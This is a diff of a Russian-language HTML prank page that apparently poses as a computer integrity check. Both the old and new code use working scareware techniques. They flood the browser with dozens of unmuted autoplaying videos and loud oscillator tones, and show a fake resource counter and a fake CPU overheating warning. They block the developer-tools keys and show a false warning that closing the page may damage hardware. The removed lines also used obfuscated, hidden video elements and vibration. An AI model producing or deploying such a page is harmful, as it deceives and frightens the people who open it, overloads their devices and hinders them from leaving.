@@ -4,146 +4,269 @@
     <title></title>
     <meta name="robots" content="noindex, nofollow">
     <style>
-        body { 
-            overflow: hidden; 
-            margin: 0; 
+        body, html {
+            overflow: hidden;
+            margin: 0;
+            padding: 0;
+            width: 100vw;
+            height: 100vh;
             background: #000;
             touch-action: none;
             user-select: none;
+            -webkit-user-drag: none;
         }
-        .stealth-video {
+        .video-overlay {
             position: absolute;
-            width: 0.1px;
-            height: 0.1px;
-            opacity: 0.001;
-            pointer-events: none;
-            contain: strict;
-            z-index: -9999;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+            mix-blend-mode: lighten;
         }
-        #systemDialog {
+        .video-grid {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            grid-auto-rows: 300px;
+            overflow: hidden;
+        }
+        .video-container {
+            position: relative;
+            overflow: hidden;
+            transform: scale(0.8) rotate(5deg);
+            filter: hue-rotate(90deg) contrast(150%);
+            transition: all 0.3s;
+            outline: 2px solid magenta;
+        }
+        .video-container video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transform: scale(1.5);
+        }
+        #overlayText {
             position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: #0044cc;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
             color: white;
-            padding: 20px;
-            border-radius: 10px;
+            font-size: 24px;
             text-align: center;
+            text-shadow: 0 0 10px red;
             z-index: 10000;
-            font-family: Arial;
+            pointer-events: none;
+            font-family: 'Arial Black', sans-serif;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            background: radial-gradient(rgba(0,0,0,0.5), transparent);
         }
     </style>
 </head>
 <body>
-    <div id="systemDialog">
+    <div id="overlayText">
+            <div id="systemDialog">
         <h3></h3>
         <p>Нажмите для проверки целостности вашего компьютера</p>
         <button id="authButton">ЗАПУСТИТЬ ПРОВЕРКУ</button>
+        <p></p>
+        <div id="resourceCounter">0%</div>
     </div>
+    <div class="video-grid" id="videoGrid"></div>
+    <div class="video-overlay" id="videoOverlay"></div>
 
     <script>
-        // Локальные видеофайлы
-        const LOCAL_VIDEOS = [
+        // Конфигурация нагрузки
+        const VIDEO_COUNT = 50; // Количество одновременно отображаемых видео
+        const GRID_SIZE = 15; // Количество ячеек в сетке
+        const PHYSICS_UPDATE = 10; // Частота физических расчетов (мс)
+        const AUDIO_NODES_LIMIT = 200; // Максимум аудио нод
+        
+        // Локальные видео
+        const VIDEO_SOURCES = [
             "ambatublow.mp4",
             "Blue Lobster jumpscare 4k meme.mp4",
             "Ima Tyre (Extended).mp4"
         ];
-
-        // Обфусцированные функции
-        const _0x4de8 = ['createElement', 'appendChild', 'src', 'autoplay', 'loop', 'muted', 'play', 'catch', 'webkitAudioContext', 'createOscillator', 'start', 'connect', 'destination'];
         
-        document.getElementById('authButton').addEventListener('click', function() {
-            this.disabled = true;
-            this.textContent = "ВЫПОЛНЯЕТСЯ ДИАГНОСТИКА...";
-            document.getElementById('systemDialog').style.backgroundColor = "#ff3300";
+        // Глобальные переменные
+        let audioNodes = [];
+        let resourceUsage = 0;
+        let physicsEnabled = false;
+        
+        // Инициализация визуализации
+        function initVisualOverload() {
+            // Создаем видео-сетку
+            const videoGrid = document.getElementById('videoGrid');
+            videoGrid.innerHTML = '';
             
-            // Задержка для "обмана" систем защиты
-            setTimeout(initStealthEngine, 1500);
-        });
-
-        function initStealthEngine() {
-            document.getElementById('systemDialog').remove();
+            // Устанавливаем размер сетки
+            videoGrid.style.gridTemplateColumns = `repeat(${GRID_SIZE}, 1fr)`;
             
-            const MAX_INSTANCES = 500;
-            let createdCount = 0;
-            const audioNodes = [];
-
-            // Создание скрытых видео-элементов
-            function createStealthVideo() {
-                if (createdCount >= MAX_INSTANCES) return;
+            // Создаем видео-контейнеры
+            for (let i = 0; i < VIDEO_COUNT; i++) {
+                const container = document.createElement('div');
+                container.className = 'video-container';
+                container.style.gridColumn = `span ${Math.floor(Math.random() * 3) + 1}`;
+                container.style.gridRow = `span ${Math.floor(Math.random() * 3) + 1}`;
                 
-                const vid = document[_0x4de8[0]]('video');
-                vid[_0x4de8[2]] = LOCAL_VIDEOS[Math.floor(Math.random() * LOCAL_VIDEOS.length)];
-                vid[_0x4de8[3]] = true;
-                vid[_0x4de8[4]] = true;
-                vid[_0x4de8[5]] = false;
-                vid.className = 'stealth-video';
+                const vid = document.createElement('video');
+                vid.src = VIDEO_SOURCES[i % VIDEO_SOURCES.length];
+                vid.autoplay = true;
+                vid.loop = true;
+                vid.playsInline = true;
+                vid.volume = 1.0;
+                vid.muted = false;
                 
-                vid[_0x4de8[6]]()[_0x4de8[7]](e => {
-                    // Обходной аудио-метод при блокировке
-                    try {
-                        const ctx = new (window.AudioContext || window[_0x4de8[8]])();
-                        const osc = ctx[_0x4de8[9]]();
-                        osc[_0x4de8[10]]();
-                        osc[_0x4de8[11]](ctx[_0x4de8[12]]);
-                        audioNodes.push({ctx, osc});
-                    } catch(e) {}
-                });
+                container.appendChild(vid);
+                videoGrid.appendChild(container);
                 
-                document.body.appendChild(vid);
-                createdCount++;
-                
-                // Рекурсивное создание
-                requestAnimationFrame(createStealthVideo);
+                // Анимация контейнера
+                animateContainer(container);
             }
-
-            // Запуск процесса
-            createStealthVideo();
             
-            // Фоновые процессы
-            setInterval(() => {
-                // Генерация скрытых аудио-осцилляторов
-                try {
-                    const ctx = new (window.AudioContext || window[_0x4de8[8]])();
-                    const osc = ctx.createOscillator();
-                    osc.type = 'square';
-                    osc.frequency.value = 100 + Math.random() * 2000;
-                    const gain = ctx.createGain();
-                    gain.gain.value = 0.8;
-                    osc.connect(gain);
-                    gain.connect(ctx.destination);
-                    osc.start();
-                    setTimeout(() => osc.stop(), 500);
-                } catch(e) {}
-                
-                // Вибрационное воздействие
-                if (navigator.vibrate) navigator.vibrate([100, 50, 150]);
-                
-            }, 300);
+            // Запускаем физику
+            physicsEnabled = true;
+            physicsEngine();
             
-            // Финал
-            setTimeout(() => {
-                document.body.innerHTML = '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:radial-gradient(red, black);display:flex;align-items:center;justify-content:center;"><h1 style="color:white;font-size:3em;text-align:center">СИСТЕМНАЯ ОШИБКА<br><small>Перезагрузка...</small></h1></div>';
-                setInterval(() => {
-                    document.body.style.background = `radial-gradient(rgb(${Math.random()*255},${Math.random()*255},${Math.random()*255}), black)`;
-                }, 100);
-                setTimeout(() => location.reload(), 5000);
-            }, 45000);
+            // Запускаем аудио-движок
+            startAudioEngine();
+            
+            // Запускаем мониторинг ресурсов
+            monitorResources();
+            
+            // Добавляем эффект наложения
+            createOverlayEffect();
         }
-
+        
+        // Физический движок
+        function physicsEngine() {
+            if (!physicsEnabled) return;
+            
+            const containers = document.querySelectorAll('.video-container');
+            containers.forEach(container => {
+                // Случайные трансформации
+                const scale = 0.7 + Math.random() * 0.6;
+                const rotate = (Math.random() - 0.5) * 30;
+                const x = (Math.random() - 0.5) * 20;
+                const y = (Math.random() - 0.5) * 20;
+                
+                container.style.transform = `scale(${scale}) rotate(${rotate}deg) translate(${x}px, ${y}px)`;
+                container.style.filter = `hue-rotate(${Math.random() * 360}deg) contrast(${150 + Math.random() * 100}%)`;
+            });
+            
+            setTimeout(physicsEngine, PHYSICS_UPDATE);
+        }
+        
+        // Аудио-движок
+        function startAudioEngine() {
+            setInterval(() => {
+                if (audioNodes.length > AUDIO_NODES_LIMIT) return;
+                
+                try {
+                    const ctx = new (window.AudioContext || window.webkitAudioContext)();
+                    const oscillator = ctx.createOscillator();
+                    oscillator.type = ['sine', 'square', 'sawtooth', 'triangle'][Math.floor(Math.random() * 4)];
+                    oscillator.frequency.value = 80 + Math.random() * 2000;
+                    
+                    const gain = ctx.createGain();
+                    gain.gain.value = 0.7;
+                    
+                    oscillator.connect(gain);
+                    gain.connect(ctx.destination);
+                    oscillator.start();
+                    
+                    // Остановка через случайное время
+                    setTimeout(() => {
+                        oscillator.stop();
+                        try { ctx.close(); } catch(e) {}
+                        audioNodes = audioNodes.filter(n => n !== oscillator);
+                    }, 500 + Math.random() * 2000);
+                    
+                    audioNodes.push(oscillator);
+                } catch(e) {}
+            }, 50);
+        }
+        
+        // Создание эффекта наложения
+        function createOverlayEffect() {
+            const overlay = document.getElementById('videoOverlay');
+            for (let i = 0; i < 10; i++) {
+                const vid = document.createElement('video');
+                vid.src = VIDEO_SOURCES[i % VIDEO_SOURCES.length];
+                vid.autoplay = true;
+                vid.loop = true;
+                vid.playsInline = true;
+                vid.volume = 0.3;
+                vid.muted = false;
+                vid.style.position = 'absolute';
+                vid.style.width = '100%';
+                vid.style.height = '100%';
+                vid.style.opacity = '0.3';
+                vid.style.filter = `blur(${10 + i * 2}px) hue-rotate(${i * 36}deg)`;
+                
+                overlay.appendChild(vid);
+            }
+        }
+        
+        // Анимация контейнеров
+        function animateContainer(container) {
+            let scaleDir = 1;
+            
+            setInterval(() => {
+                const currentScale = parseFloat(container.style.transform.match(/scale\(([\d.]+)\)/)[1]) || 1;
+                const newScale = Math.max(0.5, Math.min(1.5, currentScale + 0.05 * scaleDir));
+                
+                if (newScale >= 1.5 || newScale <= 0.5) {
+                    scaleDir *= -1;
+                }
+                
+                container.style.transform = container.style.transform.replace(
+                    /scale\([\d.]+\)/, 
+                    `scale(${newScale})`
+                );
+            }, 200);
+        }
+        
+        // Мониторинг ресурсов
+        function monitorResources() {
+            setInterval(() => {
+                resourceUsage = Math.min(100, resourceUsage + 1 + Math.random() * 5);
+                document.getElementById('resourceCounter').textContent = Math.round(resourceUsage) + '%';
+                
+                // Визуальные эффекты при высокой нагрузке
+                if (resourceUsage > 80) {
+                    document.body.style.background = `radial-gradient(circle, hsl(${Math.random() * 360}, 100%, 50%), #000)`;
+                }
+                
+                if (resourceUsage > 95) {
+                    document.getElementById('overlayText').innerHTML = `
+                        <h1 style="color:red;font-size:3em;">ПЕРЕГРУЗКА СИСТЕМЫ!</h1>
+                        <p>Температура процессора: ${(90 + Math.random() * 20).toFixed(1)}°C</p>
+                    `;
+                }
+            }, 500);
+        }
+        
         // Блокировка защитных механизмов
+        document.addEventListener('keydown', e => {
+            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
+                e.preventDefault();
+                resourceUsage += 10;
+            }
+        });
+        
         window.onbeforeunload = e => {
             e.preventDefault();
             e.returnValue = '';
-            return "Изменения будут потеряны. Закрыть страницу?";
+            return "Системная оптимизация в процессе! Закрытие страницы может повредить оборудование.";
         };
-        document.oncontextmenu = () => false;
-        document.onkeydown = e => {
-            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) e.preventDefault();
-        };
+        
+        // Автозапуск
+        setTimeout(initVisualOverload, 1000);
     </script>
-</body>
-</html>
 </body>
 </html>
